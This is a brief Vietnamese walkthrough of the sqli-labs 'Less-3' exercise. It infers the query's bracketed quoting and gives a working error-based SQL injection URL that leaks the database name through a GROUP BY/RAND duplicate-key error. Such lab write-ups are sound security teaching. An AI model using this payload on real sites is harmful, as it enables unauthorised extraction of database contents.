# Less 3

Ta thấy bài này là error based

![](../images/sqli-labs/Less-3/1.png)

Yêu cầu nhập vào một số

![](../images/sqli-labs/Less-3/2.png)

Bắt đầu thử

![](../images/sqli-labs/Less-3/3.png)

![](../images/sqli-labs/Less-3/5.png)

Có thể dự đoán câu query sẽ là:

```
select user, passwd from table where id='$ID'
```

![](../images/sqli-labs/Less-3/4.png)

![](../images/sqli-labs/Less-3/6.png)

![](../images/sqli-labs/Less-3/7.png)

Câu query có thể là:

```
select user, passwd from table where id=('$ID') limit 0,1
```

Ta có thể show được các thông tin

```
http://192.168.84.233/sqli-labs/Less-3/?id=1') and (SELECT 0 FROM (SELECT count(*), CONCAT((select database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
```

![](../images/sqli-labs/Less-3/01.png)

Ta có thể thao giống [Less-1](sqli-labs/Less-1.md))